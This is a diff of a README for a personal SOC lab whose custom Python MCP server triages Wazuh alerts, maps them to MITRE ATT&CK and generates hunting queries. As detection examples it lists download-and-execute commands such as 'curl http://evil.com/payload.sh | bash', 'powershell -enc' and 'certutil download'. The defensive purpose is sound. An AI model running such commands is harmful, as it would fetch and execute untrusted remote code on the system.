@@ -1,8 +1,36 @@
 # AI Agent MCP Lab
 
-A hands-on learning lab for understanding AI Agents, the Model Context Protocol (MCP), and AI-assisted Security Operations Center (SOC) workflows.
+A hands-on cybersecurity and AI engineering lab focused on learning how AI Agents, the Model Context Protocol (MCP), and custom security tooling can be used to automate and enhance Security Operations Center (SOC) investigations.
 
-This project was built to learn how AI agents use tools, how MCP servers expose capabilities to AI models, and how security workflows can be automated using custom Python-based MCP tools.
+This project demonstrates how AI agents can move beyond simple chat interactions by using MCP tools to perform structured security workflows, triage alerts, generate investigations, recommend actions, and assist analysts during incident response.
+
+---
+
+# Portfolio Highlights
+
+This project demonstrates:
+
+- Custom Python MCP Server Development
+- AI Agent Tool Orchestration
+- Security Workflow Automation
+- Wazuh Alert Parsing and Analysis
+- MITRE ATT&CK Mapping
+- Detection Engineering Concepts
+- Microsoft Defender Query Generation
+- Azure Sentinel Query Generation
+- Analyst Decision Support
+- AI-Assisted SOC Investigations
+
+Key capabilities include:
+
+- Alert Classification and Routing
+- SSH Authentication Failure Investigations
+- Suspicious Command Execution Investigations
+- Severity and Confidence Scoring
+- Investigation Summary Generation
+- Security Ticket Generation
+- Analyst Action Recommendations
+- Security Query Generation
 
 ---
 
@@ -16,6 +44,8 @@ This lab focuses on:
 - Creating AI-assisted security workflows
 - Practicing SOC investigation automation
 - Developing reusable security tooling
+- Exploring Detection Engineering concepts
+- Understanding how AI can support cybersecurity operations
 
 Rather than building a large infrastructure environment, this project focuses on practical AI engineering concepts that can be applied to real-world cybersecurity operations.
 
@@ -33,6 +63,8 @@ By completing this lab, I learned:
 - How tool orchestration differs from traditional automation
 - How AI can assist SOC investigations
 - How to structure security workflows using AI
+- How to build alert routing workflows
+- How to integrate MITRE ATT&CK mappings into investigations
 
 ---
 
@@ -70,35 +102,51 @@ MCP allows AI models to use tools instead of relying only on conversation contex
 
 ---
 
-# Architecture
+# Current Architecture
 
 ```text
-Wazuh Alert JSON
-        │
-        ▼
-parse_wazuh_alert
-        │
-        ▼
-score_ssh_alert
-        │
-        ▼
-generate_investigation_summary
-        │
-        ▼
+                    Wazuh Alert
+                         │
+                         ▼
+              identify_alert_type
+                         │
+        ┌────────────────┴────────────────┐
+        │                                 │
+        ▼                                 ▼
+ ssh_auth_failure        suspicious_command_execution
+        │                                 │
+        ▼                                 ▼
+ investigate_ssh_alert    investigate_command_execution
+        │                                 │
+        ▼                                 ▼
+ Investigation Package     Investigation Package
+```
+
+---
+
+# Example Investigation Flow
+
+```text
+Wazuh Alert
+    ↓
+identify_alert_type
+    ↓
 investigate_ssh_alert
-        │
-        ▼
-SOC Investigation Package
-```
-
-Additional investigation tools:
-
-```text
+    ↓
+parse_wazuh_alert
+    ↓
+score_ssh_alert
+    ↓
+generate_investigation_summary
+    ↓
 generate_wazuh_query
+    ↓
 generate_defender_kql
+    ↓
+recommend_next_action
+    ↓
+generate_soc_ticket_note
 ```
-
-These assist analysts with hunting and correlation activities.
 
 ---
 
@@ -115,9 +163,12 @@ ai-agent-mcp-lab/
 ├── notes/
 │   └── lab_journal.md
 ├── sample_data/
-│   └── wazuh_alert.json
+│   ├── wazuh_alert.json
+│   └── command_execution_alert.json
 ├── scripts/
 │   └── soc_mcp_server.py
+├── .gitignore
+├── LICENSE
 └── README.md
 ```
 
@@ -143,85 +194,133 @@ The MCP server exposes security-focused tools that can be called directly by AI 
 
 ---
 
-# MCP Tools
+# Current MCP Tools
 
-## parse_wazuh_alert
+## Alert Routing
+
+### identify_alert_type
 
 Purpose:
 
-- Parse Wazuh alert JSON
-- Extract observables
-- Normalize fields for investigations
+Classify incoming Wazuh alerts and route them to the appropriate investigation workflow.
 
-Output:
+Supported Alert Types:
+
+| Alert Type                   | Workflow                      |
+| ---------------------------- | ----------------------------- |
+| ssh_auth_failure             | investigate_ssh_alert         |
+| suspicious_command_execution | investigate_command_execution |
+| unknown                      | manual_review                 |
+
+---
+
+## Investigation Workflows
+
+### investigate_ssh_alert
+
+Purpose:
+
+Perform end-to-end triage for SSH authentication failures.
+
+Returns:
+
+- Alert Summary
+- Risk Score
+- Investigation Summary
+- Recommended Queries
+- Next Action
+
+Workflow:
+
+```text
+Parse Alert
+↓
+Score Alert
+↓
+Generate Investigation Summary
+↓
+Generate Queries
+↓
+Recommend Next Action
+↓
+Return Investigation Package
+```
+
+---
+
+### investigate_command_execution
+
+Purpose:
+
+Investigate suspicious command execution activity.
+
+Supported Indicators:
+
+- curl
+- wget
+- powershell
+- certutil
+- encoded commands
+- bash execution
+- download-and-execute patterns
+
+Example:
+
+```bash
+curl http://evil.com/payload.sh | bash
+```
+
+Outputs:
+
+- Command Summary
+- Suspicious Indicators
+- MITRE ATT&CK Mapping
+- Severity
+- Confidence Score
+- Priority
+- Recommended Queries
+- Recommended Actions
+- Analyst Notes
+
+---
+
+## Investigation Helpers
+
+### parse_wazuh_alert
+
+Extracts observables from Wazuh alerts:
 
 - Source IP
-- Target User
+- Source Port
+- User
 - Host
-- Rule Information
+- Rule ID
+- Rule Description
+- Decoder
 - Raw Log
 
 ---
 
-## score_ssh_alert
+### score_ssh_alert
 
-Purpose:
-
-Assign severity and confidence scores using rule-based logic.
-
-Inputs:
-
-- Source IP
-- Target User
-- Rule Level
-- Failure Count
-- Success After Failure
-- Known Admin Host
-
-Outputs:
+Calculates:
 
 - Severity
-- Confidence Score
+- Confidence
 - Priority
-- Recommended Next Steps
+
+Factors include:
+
+- Root account targeting
+- Failed login volume
+- Success-after-failure activity
+- Known administrative hosts
 
 ---
 
-## generate_wazuh_query
+### generate_investigation_summary
 
-Purpose:
-
-Generate OpenSearch/Wazuh hunting queries.
-
-Outputs:
-
-- OpenSearch JSON query
-- Simple filter syntax
-- Investigation guidance
-
----
-
-## generate_defender_kql
-
-Purpose:
-
-Generate Microsoft Defender and Sentinel hunting queries.
-
-Outputs:
-
-- Defender Advanced Hunting KQL
-- Sentinel Syslog KQL
-- Investigation guidance
-
----
-
-## generate_investigation_summary
-
-Purpose:
-
-Create analyst-ready investigation summaries.
-
-Outputs:
+Creates:
 
 - Executive Summary
 - Risk Assessment
@@ -230,66 +329,100 @@ Outputs:
 
 ---
 
-## investigate_ssh_alert
+### generate_soc_ticket_note
 
-Purpose:
+Creates analyst-ready documentation for:
 
-Orchestrate a complete investigation workflow.
+- ServiceNow
+- Jira
+- IBM SOAR
+- Incident Tracking Systems
 
-Internally calls:
+Includes:
 
-```text
-parse_wazuh_alert
-      ↓
-score_ssh_alert
-      ↓
-generate_investigation_summary
-```
-
-Returns:
-
-```json
-{
-  "alert_summary": {},
-  "risk_score": {},
-  "investigation_summary": {}
-}
-```
+- Summary
+- Observables
+- Severity
+- Analysis
+- Recommended Actions
+- Next Steps
 
 ---
 
-# Example Workflow
+### recommend_next_action
 
-Input:
+Provides analyst guidance based on:
+
+- Severity
+- Confidence
+- Priority
+
+Example recommendations:
+
+| Confidence | Recommendation                        |
+| ---------- | ------------------------------------- |
+| 80+        | Escalate and begin containment review |
+| 60-79      | Gather additional evidence            |
+| <60        | Continue investigation                |
+
+---
+
+### generate_wazuh_query
+
+Generates:
+
+- OpenSearch JSON queries
+- Wazuh Discover filters
+- Investigation guidance
+
+---
+
+### generate_defender_kql
+
+Generates:
+
+- Microsoft Defender Advanced Hunting KQL
+- Azure Sentinel Syslog KQL
+- Investigation guidance
+
+---
+
+# Current Supported Alert Types
+
+## SSH Authentication Failure
+
+Examples:
 
 ```text
-sample_data/wazuh_alert.json
+Failed password
+sshd authentication failure
+Brute force attempts
+Root login attempts
 ```
 
 Workflow:
 
 ```text
-Alert
-  ↓
-Parse
-  ↓
-Score
-  ↓
-Summarize
-  ↓
-Investigation Package
+investigate_ssh_alert
 ```
 
-Example Output:
+---
+
+## Suspicious Command Execution
+
+Examples:
 
 ```text
-Severity: High
-Confidence: 80
-Priority: P2
+curl http://evil.com | bash
+wget payload.sh
+powershell -enc
+certutil download
+```
 
-Root account targeted
-15 failed logins in 10 minutes
-Potential brute-force activity
+Workflow:
+
+```text
+investigate_command_execution
 ```
 
 ---
@@ -301,28 +434,62 @@ Potential brute-force activity
 - Security Automation
 - Detection Engineering
 - Wazuh Investigations
-- OpenSearch Queries
+- MITRE ATT&CK Mapping
+- OpenSearch Query Development
 - Microsoft Defender Hunting
-- Sentinel Hunting
+- Azure Sentinel Hunting
 - AI-Assisted SOC Workflows
 - MCP Tool Orchestration
+- Security Workflow Routing
 
 ---
 
-# Future Enhancements
+# Current Project Status
 
-Planned additions:
+Completed:
 
-- CrowdStrike query generation
-- QRadar AQL generation
-- Splunk SPL generation
-- Threat intelligence enrichment
-- Asset inventory lookups
-- IOC enrichment
-- Multi-alert correlation
-- Real API integrations
-- AI-hosted MCP services
-- Integration with future AI lab infrastructure
+✅ Custom Python MCP Server
+
+✅ Wazuh Alert Parsing
+
+✅ Alert Classification & Routing
+
+✅ SSH Authentication Failure Workflow
+
+✅ Suspicious Command Execution Workflow
+
+✅ Severity & Confidence Scoring
+
+✅ MITRE ATT&CK Mapping
+
+✅ OpenSearch Query Generation
+
+✅ Defender KQL Generation
+
+✅ Sentinel Query Generation
+
+✅ Investigation Summary Generation
+
+✅ SOC Ticket Note Generation
+
+✅ Analyst Decision Recommendations
+
+---
+
+# Planned Future Enhancements
+
+- Malware Investigation Workflow
+- PowerShell Investigation Workflow
+- Privilege Escalation Workflow
+- Persistence Detection Workflow
+- Threat Intelligence Enrichment
+- IOC Reputation Lookups
+- QRadar AQL Query Generation
+- Splunk SPL Query Generation
+- Multi-Alert Correlation
+- Detection Engineering Recommendations
+- Security Copilot-Style Investigation Chains
+- Integration with Future AI Security Labs
 
 ---
 
@@ -338,275 +505,6 @@ Workflows combine tools into useful outcomes.
 
 This project demonstrates how AI agents can augment security operations by combining reasoning, structured tooling, and repeatable workflows.
 
-## Current Status
-
-This project currently includes a working custom Python MCP server with multiple SOC-focused tools and one orchestrated SSH alert investigation workflow.
-
-The lab is currently local-only and does not connect to production security tools or external APIs.
-
-## Current Workflow Output
-
-The `investigate_ssh_alert` tool returns a complete SOC triage package:
-
-- Alert summary
-- Risk score
-- Investigation summary
-- Recommended Wazuh/OpenSearch query
-- Recommended Defender/Sentinel queries
-
-This allows an analyst to move from a raw Wazuh alert to a structured investigation package in one MCP tool call.
-
-## Current MCP Tools
-
-### identify_alert_type
-
-Purpose:
-
-Classify Wazuh alerts and recommend the correct investigation workflow.
-
-Current classifications:
-
-| Alert Type       | Workflow              |
-| ---------------- | --------------------- |
-| ssh_auth_failure | investigate_ssh_alert |
-| unknown          | manual_review         |
-
-Example:
-
-```json
-{
-  "alert_type": "ssh_auth_failure",
-  "recommended_workflow": "investigate_ssh_alert",
-  "confidence": "high"
-}
-```
-
----
-
-### parse_wazuh_alert
-
-Purpose:
-
-Parse Wazuh alert JSON and extract security observables.
-
-Extracted fields include:
-
-- Source IP
-- Source Port
-- Target User
-- Host
-- Rule Information
-- Decoder
-- Raw Log
-
----
-
-### score_ssh_alert
-
-Purpose:
-
-Assign severity, confidence, and priority using rule-based logic.
-
-Factors currently include:
-
-- Failed login activity
-- Root account targeting
-- Brute-force volume
-- Success after failure
-- Known administrative source hosts
-
-Outputs:
-
-- Severity
-- Confidence Score
-- Priority
-- Recommended Next Steps
-
----
-
-### generate_wazuh_query
-
-Purpose:
-
-Generate OpenSearch/Wazuh hunting queries.
-
-Outputs:
-
-- OpenSearch JSON query
-- Discover filter syntax
-- Analyst guidance
-
----
-
-### generate_defender_kql
-
-Purpose:
-
-Generate Microsoft Defender and Sentinel hunting queries.
-
-Outputs:
-
-- Defender Advanced Hunting query
-- Sentinel Syslog query
-- Investigation guidance
-
----
-
-### generate_investigation_summary
-
-Purpose:
-
-Create analyst-ready investigation summaries.
-
-Outputs:
-
-- Executive Summary
-- Risk Assessment
-- Recommended Actions
-- Analyst Notes
-
----
-
-### generate_soc_ticket_note
-
-Purpose:
-
-Generate ticket-ready notes for:
-
-- ServiceNow
-- Jira
-- IBM SOAR
-- Other case management platforms
-
-Outputs:
-
-- Summary
-- Observables
-- Severity/Priority
-- Analysis
-- Recommended Actions
-- Next Steps
-
----
-
-### recommend_next_action
-
-Purpose:
-
-Recommend analyst actions based on severity and confidence.
-
-Examples:
-
-| Confidence | Recommendation                        |
-| ---------- | ------------------------------------- |
-| >= 80      | Escalate and begin containment review |
-| 60-79      | Gather additional evidence            |
-| < 60       | Continue investigation                |
-
-Outputs:
-
-- Recommended Action
-- Reasoning
-- Recommended Tool
-- Analyst Guidance
-
----
-
-### investigate_ssh_alert
-
-Purpose:
-
-Perform a complete SSH authentication failure investigation workflow.
-
-Workflow:
-
-```text
-Wazuh Alert
-    ↓
-parse_wazuh_alert
-    ↓
-score_ssh_alert
-    ↓
-generate_investigation_summary
-    ↓
-generate_wazuh_query
-    ↓
-generate_defender_kql
-    ↓
-recommend_next_action
-    ↓
-Return Complete Investigation Package
-```
-
-Returns:
-
-```json
-{
-  "alert_summary": {},
-  "risk_score": {},
-  "investigation_summary": {},
-  "recommended_queries": {},
-  "next_action": {}
-}
-```
-
----
-
-## Current Investigation Workflow
-
-```text
-Raw Wazuh Alert
-        │
-        ▼
-identify_alert_type
-        │
-        ▼
-investigate_ssh_alert
-        │
-        ▼
-Alert Summary
-Risk Score
-Investigation Summary
-Recommended Queries
-Next Action
-```
-
----
-
-## Current Status
-
-Implemented:
-
-- Custom Python MCP Server
-- Wazuh Alert Parsing
-- SSH Authentication Failure Investigation
-- Severity Scoring
-- OpenSearch Query Generation
-- Defender/Sentinel Query Generation
-- Investigation Summary Generation
-- Ticket Note Generation
-- Analyst Decision Recommendations
-- Alert Type Routing
-
-The project currently supports:
-
-- SSH Authentication Failure investigations
-
-Planned future support:
-
-- Malware Detection
-- Suspicious PowerShell Activity
-- Privilege Escalation
-- Persistence Mechanisms
-- Threat Intelligence Enrichment
-- Multi-alert Correlation
-- Detection Engineering Recommendations
-- Additional SIEM Platforms (QRadar, Splunk)
-
-```
-
-```
-
 ---
 
 # Author
@@ -615,10 +513,12 @@ Sydney McGee
 
 Cybersecurity Analyst | Security Automation Enthusiast | AI Security Engineering Learner
 
-Current focus:
+Current Focus:
 
 - AI Agents
 - MCP
 - Security Automation
 - Detection Engineering
-- SOC Workflow Engineering
+- Security Engineering
+- AI Security Engineering
+- SOC Workflow Automation
